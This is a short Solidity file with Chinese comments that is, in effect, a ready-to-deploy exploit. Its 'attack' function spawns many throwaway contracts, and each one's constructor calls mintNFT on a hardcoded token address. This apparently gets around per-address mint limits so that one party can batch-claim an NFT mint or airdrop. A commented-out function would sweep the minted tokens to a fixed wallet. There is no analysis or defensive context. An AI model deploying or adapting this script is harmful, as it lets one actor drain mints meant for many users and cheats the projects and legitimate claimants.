// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAir {
    function mintNFT(uint256 num) payable external;
}



contract token_address {
    constructor(address token){
        IAir(token).mintNFT(1);
    }
}


//部署这个类
contract batch_claim_token {
    constructor(){}

    //调用这个函数，参数就是领取数量
    function attack(uint amount) payable public{
        for (uint i = 0; i <amount;i++)
        {
            new token_address(0x1dC298326d7EB837870574Ef82FbE98940A4bd03);
        }
    }

    // function withdraw(uint256 start,uint256 end) public {
    //     for(uint i=start;i<end;i++){
    //         IAir(0x2D61B5eB61C82Ed55c79865a960121458BbCaCD8).safeTransferFrom(address(this),0x8a09FB23E1c8d0FF9c9Fef0BcFc9b9e07B1f0667,i);
    //     }
    // }
}